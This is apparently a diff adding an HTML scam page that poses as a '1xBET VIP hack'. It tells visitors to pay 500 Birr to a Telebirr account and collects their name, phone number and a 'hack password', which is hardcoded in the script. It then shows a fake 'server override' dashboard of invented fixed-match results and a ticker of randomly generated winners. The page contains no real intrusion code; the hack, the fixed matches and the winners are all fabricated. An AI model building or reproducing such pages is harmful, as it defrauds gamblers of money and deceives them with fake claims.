@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP 1xBET HACK | Official Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(-45deg, #000000, #0a0a0a, #0b1a2a, #003366);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
+        }
+        @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+        .telebirr-blue { background-color: #00ADEF; box-shadow: 0 4px 20px rgba(0, 173, 239, 0.5); }
+        .vip-gold-border { border: 2px solid #fbbf24; box-shadow: 0 0 30px rgba(251, 191, 36, 0.4); }
+        .hidden-screen { display: none !important; }
+        
+        .xbet-logo { font-weight: 900; font-size: 2.5rem; letter-spacing: -2px; color: #fff; }
+        .xbet-blue { color: #00a0e3; }
+
+        #winner-toast {
+            position: fixed; bottom: 20px; left: 20px;
+            background: rgba(0, 0, 0, 0.9); backdrop-filter: blur(10px);
+            border: 1px solid #00a0e3; padding: 12px 24px; border-radius: 15px;
+            z-index: 100; transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transform: translateY(200%);
+        }
+    </style>
+</head>
+<body class="text-white font-sans overflow-x-hidden min-h-screen">
+
+    <div id="winner-toast" class="flex items-center gap-3">
+        <i class="fas fa-chart-line text-blue-400"></i>
+        <span id="winner-text" class="text-sm font-bold tracking-tight"></span>
+    </div>
+
+    <div id="activation-screen" class="flex flex-col items-center justify-center p-6 min-h-screen">
+        <div class="text-center mb-10 xbet-logo">
+            1x<span class="xbet-blue">BET</span>
+            <p class="text-gray-400 font-bold tracking-[0.2em] text-[10px] uppercase -mt-2">VIP HACK DIVISION</p>
+        </div>
+
+        <div class="bg-gray-900/95 backdrop-blur-xl vip-gold-border p-8 rounded-[2.5rem] max-w-md w-full relative">
+            <div class="absolute -top-4 left-1/2 -translate-x-1/2 bg-blue-600 px-4 py-1 rounded-full text-[10px] font-black tracking-widest uppercase">System Encrypted</div>
+
+            <div class="space-y-6">
+                <div class="telebirr-blue p-5 rounded-2xl text-center">
+                    <p class="text-[10px] uppercase font-black opacity-70">Pay 500 Birr to Telebirr Account</p>
+                    <p class="text-2xl font-black my-1 tracking-tighter">1000743353971</p>
+                    <p class="text-[10px] font-bold opacity-80 italic">For 1xBET VIP Ticket Access</p>
+                </div>
+
+                <div class="space-y-3">
+                    <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-black/50 border border-gray-800 rounded-xl p-4 outline-none focus:border-blue-500 transition-all text-sm">
+                    <input type="tel" id="user-phone" placeholder="Phone Number" class="w-full bg-black/50 border border-gray-800 rounded-xl p-4 outline-none focus:border-blue-500 transition-all text-sm">
+                    <input type="password" id="user-pass" placeholder="VIP Hack Password" class="w-full bg-black/50 border-2 border-yellow-500/20 rounded-xl p-4 outline-none focus:border-yellow-500 transition-all text-sm font-mono tracking-widest">
+                </div>
+
+                <button id="activate-btn" onclick="startActivation()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-black py-5 rounded-2xl text-lg uppercase">
+                    Activate 1xBET Hack
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashboard" class="hidden-screen">
+        <nav class="bg-black/80 backdrop-blur-md p-4 border-b border-blue-500/30 flex justify-between items-center sticky top-0 z-50">
+            <div class="font-black text-lg">1x<span class="xbet-blue">BET</span> VIP</div>
+            <div class="flex items-center gap-4 bg-blue-500/10 px-4 py-2 rounded-xl border border-blue-500/30">
+                <div class="text-right">
+                    <p id="nav-name" class="text-[10px] font-bold uppercase text-gray-400"></p>
+                    <p class="text-green-400 font-black text-sm">1,000.00 ETB</p>
+                </div>
+            </div>
+        </nav>
+
+        <div class="p-6 max-w-4xl mx-auto space-y-6">
+            <div class="bg-green-500/10 border border-green-500/50 p-4 rounded-2xl flex items-center gap-4">
+                <i class="fas fa-check-circle text-green-400 text-2xl animate-pulse"></i>
+                <h3 class="font-black text-green-400 text-xs uppercase italic">1xBET Server Override Active: 5 FIXED MATCHES FOUND</h3>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="match-container">
+                </div>
+        </div>
+    </div>
+
+    <script>
+        const matches = [
+            { teams: "Man City vs Arsenal", result: "1 (Home Win)", odds: "1.85", type: "PREMIER LEAGUE" },
+            { teams: "Real Madrid vs Barcelona", result: "X (Draw)", odds: "3.40", type: "LA LIGA" },
+            { teams: "Bayern vs Dortmund", result: "1 (Home Win)", odds: "1.55", type: "BUNDESLIGA" },
+            { teams: "Inter Milan vs AC Milan", result: "2 (Away Win)", odds: "2.10", type: "SERIE A" },
+            { teams: "PSG vs Marseille", result: "1 (Home Win)", odds: "1.45", type: "LIGUE 1" }
+        ];
+
+        function loadMatches() {
+            const container = document.getElementById('match-container');
+            matches.forEach((m, i) => {
+                container.innerHTML += `
+                    <div class="bg-gray-900 p-6 rounded-3xl border border-gray-800 hover:border-blue-500/50 transition">
+                        <p class="text-[10px] text-blue-400 font-bold mb-2 uppercase">${m.type} • FIXED SLIP #${i+1}</p>
+                        <div class="flex justify-between items-center text-sm font-bold">
+                            <span>${m.teams}</span>
+                            <span class="bg-blue-600 text-white px-3 py-1 rounded text-[10px] font-black">${m.result}</span>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function startActivation() {
+            const name = document.getElementById('user-name').value;
+            const pass = document.getElementById('user-pass').value;
+            const btn = document.getElementById('activate-btn');
+
+            if (pass !== "171817") {
+                alert("INCORRECT PASSWORD! Pay 500 Birr to 1000743353971.");
+                return;
+            }
+
+            btn.innerHTML = 'SYNCING 1xBET SERVERS...';
+            setTimeout(() => {
+                document.getElementById('activation-screen').classList.add('hidden-screen');
+                document.getElementById('dashboard').classList.remove('hidden-screen');
+                document.getElementById('nav-name').innerText = name;
+                loadMatches();
+            }, 2000);
+        }
+
+        // Random Winner Ticker
+        setInterval(() => {
+            const toast = document.getElementById('winner-toast');
+            const text = document.getElementById('winner-text');
+            const amount = (Math.random() * 8000 + 2000).toFixed(2);
+            text.innerText = `User_VIP_${Math.floor(Math.random()*100)} WON ${amount} ETB`;
+            toast.style.transform = "translateY(0)";
+            setTimeout(() => { toast.style.transform = "translateY(200%)"; }, 3500);
+        }, 8000);
+    </script>
+</body>
+</html>
